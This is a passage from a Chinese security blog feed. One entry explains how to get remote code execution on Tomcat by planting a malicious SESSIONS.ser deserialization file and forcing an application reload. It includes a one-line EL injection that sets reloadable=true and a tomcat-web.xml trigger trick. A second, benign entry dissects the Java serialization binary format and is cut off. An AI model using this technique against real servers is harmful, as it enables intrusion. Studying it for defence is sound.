class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doLoad</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line"><span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">log.debug(<span class="string">&quot;Start: Loading persisted sessions&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize our internal data structures</span></span><br><span class="line">sessions.clear();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open an input stream to the specified pathname, if any</span></span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> file();</span><br><span class="line"><span class="keyword">if</span> (file == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">log.debug(sm.getString(<span class="string">&quot;standardManager.loading&quot;</span>, pathname));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Loader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">Log</span> <span class="variable">logger</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file.getAbsolutePath());</span><br><span class="line"><span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(fis)) &#123;</span><br><span class="line"><span class="type">Context</span> <span class="variable">c</span> <span class="operator">=</span> getContext();</span><br><span class="line">loader = c.getLoader();</span><br><span class="line">logger = c.getLogger();</span><br><span class="line"><span class="keyword">if</span> (loader != <span class="literal">null</span>) &#123;</span><br><span class="line">classLoader = loader.getClassLoader();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (classLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">classLoader = getClass().getClassLoader();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load the previously unloaded active sessions</span></span><br><span class="line"><span class="keyword">synchronized</span> (sessions) &#123;</span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomObjectInputStream</span>(bis, classLoader, logger,</span><br><span class="line">getSessionAttributeValueClassNamePattern(),</span><br><span class="line">getWarnOnSessionAttributeFilterFailure())) &#123;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> (Integer) ois.readObject();</span><br><span class="line"><span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> count.intValue();</span><br><span class="line"><span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">log.debug(<span class="string">&quot;Loading &quot;</span> + n + <span class="string">&quot; persisted sessions&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="type">StandardSession</span> <span class="variable">session</span> <span class="operator">=</span> getNewSession();</span><br><span class="line">session.readObjectData(ois);</span><br><span class="line">session.setManager(<span class="built_in">this</span>);</span><br><span class="line">sessions.put(session.getIdInternal(), session);</span><br><span class="line">session.activate();</span><br><span class="line"><span class="keyword">if</span> (!session.isValidInternal()) &#123;</span><br><span class="line"><span class="comment">// If session is already invalid,</span></span><br><span class="line"><span class="comment">// expire session to prevent memory leak.</span></span><br><span class="line">session.setValid(<span class="literal">true</span>);</span><br><span class="line">session.expire();</span><br><span class="line">&#125;</span><br><span class="line">sessionCounter++;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="comment">// Delete the persistent storage file</span></span><br><span class="line"><span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">file.delete();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line"><span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">log.debug(<span class="string">&quot;No persisted data file found&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">log.debug(<span class="string">&quot;Finish: Loading persisted sessions&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doUnload</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">log.debug(sm.getString(<span class="string">&quot;standardManager.unloading.debug&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sessions.isEmpty()) &#123;</span><br><span class="line">log.debug(sm.getString(<span class="string">&quot;standardManager.unloading.nosessions&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>; <span class="comment">// nothing to do</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open an output stream to the specified pathname, if any</span></span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> file();</span><br><span class="line"><span class="keyword">if</span> (file == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">log.debug(sm.getString(<span class="string">&quot;standardManager.unloading&quot;</span>, pathname));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Keep a note of sessions that are expired</span></span><br><span class="line">ArrayList&lt;StandardSession&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file.getAbsolutePath());</span><br><span class="line"><span class="type">BufferedOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(fos);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">synchronized</span> (sessions) &#123;</span><br><span class="line"><span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">log.debug(<span class="string">&quot;Unloading &quot;</span> + sessions.size() + <span class="string">&quot; sessions&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Write the number of active sessions, followed by the details</span></span><br><span class="line">oos.writeObject(Integer.valueOf(sessions.size()));</span><br><span class="line"><span class="keyword">for</span> (Session s : sessions.values()) &#123;</span><br><span class="line"><span class="type">StandardSession</span> <span class="variable">session</span> <span class="operator">=</span> (StandardSession) s;</span><br><span class="line">list.add(session);</span><br><span class="line">session.passivate();</span><br><span class="line">session.writeObjectData(oos);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Expire all the sessions we just wrote</span></span><br><span class="line"><span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">log.debug(<span class="string">&quot;Expiring &quot;</span> + list.size() + <span class="string">&quot; persisted sessions&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (StandardSession session : list) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">session.expire(<span class="literal">false</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">ExceptionUtils.handleThrowable(t);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">session.recycle();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">log.debug(<span class="string">&quot;Unloading complete&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且可以发现其存储的路径是通过下面的代码获取的：</p><p><img src="/imgs/Pasted%20image%2020240304031039.png"></p><p>这里的 <code>pathname</code> 默认值就是 <code>SESSIONS.ser</code> 。</p><p><img src="/imgs/Pasted%20image%2020240304031119.png"></p><h1 id="实验测试"><a href="#实验测试" class="headerlink" title="实验测试"></a>实验测试</h1><p>我们写一个 <code>cc9</code>  的反序列化 <code>exp</code> 到 <code>SESSIONS.ser</code> 文件中，然后启动 <code>Tomcat</code> ，发现成功命令执行。</p><p><img src="/imgs/Pasted%20image%2020240304032813.png"></p><h1 id="进一步分析"><a href="#进一步分析" class="headerlink" title="进一步分析"></a>进一步分析</h1><p>根据上面的分析，我们可以发现这种攻击方式其实很鸡肋，因为不仅需要程序项目没有用到 <code>session</code> （因为如果项目自身用到了 <code>session</code> ，那么在关闭 <code>Tomcat</code> 的时候写入 <code>session</code> 的内容到 <code>SESSIONS.ser</code> 文件中，就会覆盖我们上传的 <code>SESSIONS.ser</code> 文件，但是这点并不是很鸡肋，因为现在大部分的项目都是前后端分离，使用的是 <code>token</code> 鉴权而非 <code>session</code> ，所以现在很多项目都没有用 <code>session</code> ），最重要是需要重新启动 <code>Tomcat</code> 才能生效，而实战中我们几乎不可能让目标重启 <code>Tomcat</code> 。</p><p>有没有办法让目标不重启就可以加载 <code>SESSIONS.ser</code> 文件呢？</p><p>答案是可以的！</p><blockquote><p>Whenever Apache Tomcat is shut down normally and restarted, or when an application reload is triggered, the standard Manager implementation will attempt to serialize all currently active sessions to a disk file located via the pathname attribute. All such saved sessions will then be deserialized and activated (assuming they have not expired in the mean time) when the application reload is completed.</p></blockquote><p>因此根据官方文档可以看出来，除了服务停止或者重启，还可以让部署的程序触发 <code>reload</code> 来做到。</p><p><img src="/imgs/Pasted%20image%2020240304035048.png"></p><blockquote><p>这里的思路是参考 <code>2022 rwctf Desperate Cat</code> 的出题人 <code>wp</code> 的，其中 <code>wp</code> 利用到了这个技巧。</p></blockquote><p>让 <code>Tomcat</code> 部署的程序进行 <code>reload</code> 有两种方式：</p><h2 id="第一种reload的方式"><a href="#第一种reload的方式" class="headerlink" title="第一种reload的方式"></a>第一种reload的方式</h2><p>第一种 <code>reload</code> 的方式需要满足两个条件：</p><p><img src="/imgs/Pasted%20image%2020240304035422.png"></p><ol><li><code>Context reloadable</code> 配置为 <code>true</code>（默认是 <code>false</code> ）；</li><li><code>/WEB-INF/classes/</code> 或者 <code>/WEB-INF/lib/</code> 目录下的文件发生变化。</li></ol><p>由于 <code>Context reloadable</code> 默认是 <code>false</code> ，要动态修改它可以通过执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.servletContext.classLoader.resources.context.reloadable=true&#125;</span><br></pre></td></tr></table></figure><p>至于怎么修改，就具体情况具体分析了。</p><p>然后上传文件到 <code>/WEB-INF/classes/</code> 目录或者 <code>/WEB-INF/lib/</code> 目录下就可以触发 <code>Tomcat</code> <code>reload</code> 程序了。</p><blockquote><p>但是这里需要注意的是：如果上传的 <code>jar</code> 包或者 <code>class</code> 文件的格式错误，会导致程序异常崩溃，从而整个网页都无法正常访问了。</p></blockquote><p><img src="/imgs/Pasted%20image%2020240304040355.png"></p><h2 id="第二种reload的方式"><a href="#第二种reload的方式" class="headerlink" title="第二种reload的方式"></a>第二种reload的方式</h2><p>第一种方式由于需要修改 <code>reloadable</code> 的值，但是大部分情况应该都是改不了的，所以相对来说不是很好用。这里可以用第二种方式。</p><blockquote><p>WatchedResource - The auto deployer will monitor the specified static resource of the web application for updates, and will reload the web application if it is updated. The content of this element must be a string.</p></blockquote><p>在 <code>Tomcat 9</code> 环境下，默认的 <code>WatchedResource</code> 包括：</p><ul><li><code>WEB-INF/web.xml</code></li><li><code>WEB-INF/tomcat-web.xml</code></li><li><code>$&#123;CATALINA_HOME&#125;/conf/web.xml</code></li></ul><p><code>Tomcat</code> 会有后台线程去监控这些文件资源，在 <code>Tomcat</code> 开启 <code>autoDeploy</code> 的情况下（此值默认为 <code>true</code>，即默认开启 <code>autoDeploy</code> ），一旦发现这些文件资源的 <code>lastModified</code> 时间被修改，也会触发 <code>reload</code> ：</p><p><img src="/imgs/Pasted%20image%2020240305023934.png"></p><p>由于应用本身没有 <code>WEB-INF/tomcat-web.xml</code> 配置文件， 因此通过利用程序本身的写文件漏洞，来创建一个 <code>WEB-INF/tomcat-web.xml/</code> 目录，也可以让应用强行触发 <code>reload</code> ，加载并反序列化先前写入的恶意 <code>SESSIONS.ser</code> 文件。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当 <code>Tomcat</code> 部署的程序具有任意文件上传漏洞的时候，我们可以先上传一个恶意的 <code>SESSIONS.ser</code> 文件到 <code>Tomcat</code> 的 <code>work</code> 目录，然后再上传一个 <code>WEB-INF/tomcat-web.xml</code> 文件（内容随便）来触发 <code>Tomcat</code> 的 <code>reload</code> ，进而反序列化 <code>SESSIONS.ser</code> 文件产生反序列化漏洞。</p><p>此外，如果靶机可以加载我们指定任意的类，我们还可以上传恶意的 <code>jar</code> 包到 <code>WEB-INF/lib/</code> 目录下，然后再来指定靶机加载我们恶意的 <code>jar</code> 包中的 <code>class</code> 文件，执行其中 <code>static</code> 代码块中的代码，造成 <code>RCE</code> 。这种方式好在不需要靶机有反序列化漏洞的组件，但是需要我们能够加载我们通过文件上传漏洞上传的 <code>jar</code> 包中的 <code>class</code> 文件。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> Tomcat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java序列化后的二进制格式分析</title>
      <link href="/2024/03/02/java%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
      <url>/2024/03/02/java%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>在阅读后面的内容时，这里先要提前准备好两个工具：</p><ol><li>下载 <a href="https://github.com/NickstaDB/SerializationDumper">https://github.com/NickstaDB/SerializationDumper</a> 工具来可视化二进制的序列化数据的结构。<br>不过这个工具的运行需要传入二进制文件的十六进制表示。因此使用前我们需要用下面的 <code>python</code> 脚本处理一下，将二进制文件的内容读取出来，并以十六进制的格式输出。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">binascii</span></span><br><span class="line"></span><br><span class="line"><span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;demo.ser&quot;</span></span><br><span class="line">with <span class="title function_">open</span><span class="params">(path, <span class="string">&quot;rb&quot;</span>)</span> as f:</span><br><span class="line">    content = f.read()</span><br><span class="line">    print(binascii.b2a_hex(content).decode())</span><br></pre></td></tr></table></figure><p>使用方式： <code>java -jar SerializationDumper.jar &lt;十六进制字符串&gt;</code> 。</p><ol start="2"><li><code>idea</code> 下载 <code>BinEd - Binary/Hex Editor</code> 插件来查看和编辑二进制文件。这里使用 <code>010 editor</code> 也是可以的。</li></ol><p><img src="/imgs/Pasted%20image%2020240228180255.png"></p><blockquote><p>此外， <code>java</code> 序列化使用到的常数定义在 <code>ObjectStreamConstants</code> 接口中，后面会用到。</p></blockquote><p><img src="/imgs/Pasted%20image%2020240228191845.png"></p><h1 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h1><h2 id="示例一"><a href="#示例一" class="headerlink" title="示例一"></a>示例一</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;tom&quot;</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;demo1.ser&quot;</span>;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化得到的二进制文件用上面提到的 <code>idea</code> 插件打开样式如下：</p><p><img src="/imgs/Pasted%20image%2020240228191220.png"></p><p>再用上面的第一个工具分析其结构：</p><p><img src="/imgs/Pasted%20image%2020240228191659.png"></p><p>接下来我们逐字节详细的分析序列化得到的二进制内容。</p><p>刚开始的两个字节 <code>ACED</code> 是 <code>jdk</code> 原生序列化后二进制流固定的魔数，用于判断这个二进制流是否是 <code>jdk</code> 原生的序列化数据。对应 <code>STREAM_MAGIC</code> 。</p><p>接下来的两个字节 <code>0005</code> 用于表示流协议的版本。对应 <code>STREAM_VERSION</code> 。大多数情况都是 <code>0005</code> 。</p><p>再接下来的一个字节 <code>73</code> 表示序列化的是一个对象。对应 <code>TC_OBJECT</code> 。举个其它的例子，如果序列化的是一个字符串类型，则这个字节应为 <code>TC_STRING</code> ，对应 <code>74</code> 。</p><p>后面的一个字节 <code>72</code> 标识对象的类描述信息的开始，就是说下一个二进制块的内容是类描述信息。对应 <code>TC_CLASSDESC</code> 。</p><p>再后面的两个字节 <code>0013</code> 表示对象类全名的长度为 <code>19</code> ，然后再后面就是类全名 <code>com.just.demo1.User</code> 。</p><p>再后面的八个字节表示的是当前对象中定义的 <code>serialVersionUID</code> 值。代码中的定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3208092597671621268L</span>;</span><br></pre></td></tr></table></figure><p>其值 <code>3208092597671621268</code> 转换成十六进制的值就是：<code>2C 85 6F 38 6A C6 F2 94</code> ；需要注意的是 <strong>如果一个类中没有定义该值系统会自动生成一个新的值</strong> ，在二进制序列中追加在此处，因为 <code>serialVersionUID</code> 的类型是 <code>long</code> 类型的，所以它占用了 <code>8</code> 个字节，所以系统自动生成的时候也会自动创建一个 <code>long</code> 类型的数据【 <code>8</code> 个字节的二进制序列】。</p><p>接下来的一个字节 <code>02</code> 表示这个对象是实现了 <code>Serializable</code> 接口的。</p><p><img src="/imgs/Pasted%20image%2020240227152517.png"></p><p>再接下来的两个字节 <code>0002</code> 表示这个对象序列化了的属性的数量。也就是没有被 <code>transient</code> 关键字标识了的属性的数量。</p><p>再后面就是这两个属性的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 第一个字段age的信息</span><br><span class="line">49 00 03 61 67 65</span><br><span class="line">// 第二个字段name的信息</span><br><span class="line">4C 00 04 6E 61 6D 65 </span><br></pre></td></tr></table></figure><p>第一个字段的第一个字节转换会字符是 <code>I</code> ，表示这个字段是 <code>int</code> 类型的，然后后面的两个字节 <code>00 03</code> 表示字段名的长度为 <code>3</code> ，然后 <code>61 67 65</code> 就是字段名的 <code>ASCII</code> 码。</p><p>第二个字段同理，<code>4C</code> 转化为字符是 <code>L</code> ，表示这个字段是引用类型（非基本类型）的，然后后面的两个字节 <code>00 04</code> 表示字段名的长度为 <code>4</code> ，然后 <code>6E 61 6D 65</code> 就是字段名的 <code>ASCII</code> 码。由于这个字段是引用类型的（被标识了 <code>L</code> ），那么后面还需要一块内容来标识这个引用类型的类。也就对应后面的 <code>74 00 12 4C 6A 61 76 61 2F 6C 61 6E 67 2F 53 74 72 69 6E 67 3B</code> 。开头的 <code>74</code> 为 <code>TC_STRING</code> ，也就是说后面的内容是字符串。然后 <code>00 12</code> 标识字符串的长度，然后一直到最后就都是字符串本身。这里的字符串就是前面引用类型的类全名 <code>Ljava/lang/String;</code> 。记得注意结尾的分号。</p><p>到这里就结束了类字段信息的部分。后面的 <code>78</code> 即 <code>TC_ENDBLOCKDATA</code> ，标识这段内容的结束。<code>70</code> 即 <code>TC_NULL</code> ，标识这个类没有父类。这里是不考虑 <code>Object</code> 类的。</p><p>最后一块内容就是类字段的具体值。第一个字段是 <code>int</code> 类型的，占四个字节，就是 <code>00 00 00 15</code> 表示 <code>age</code> 字段的值为 <code>21</code> 。第二个字段是 <code>String</code> 类型的，就需要开头用 <code>74</code> 来标识，然后是字符串的长度和字符串的具体值。</p><h2 id="示例二"><a href="#示例二" class="headerlink" title="示例二"></a>示例二</h2><p>再看一个稍微复杂一点的案例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String path;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Address</span><span class="params">(String path)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.path = path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> Address address;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age, Address address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Address</span> <span class="variable">address</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>(<span class="string">&quot;wuhan&quot;</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;tom&quot;</span>, <span class="number">21</span>, address);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;demo2.ser&quot;</span>;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(user);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        System.out.println(ois.readObject());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/imgs/Pasted%20image%2020240301233206.png"></p><p><img src="/imgs/Pasted%20image%2020240301233345.png"></p><p>这里开头固定的结构和前面一样就不细说了，直接到类字段结构的一部分。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 序列化二进制流的魔数</span><br><span 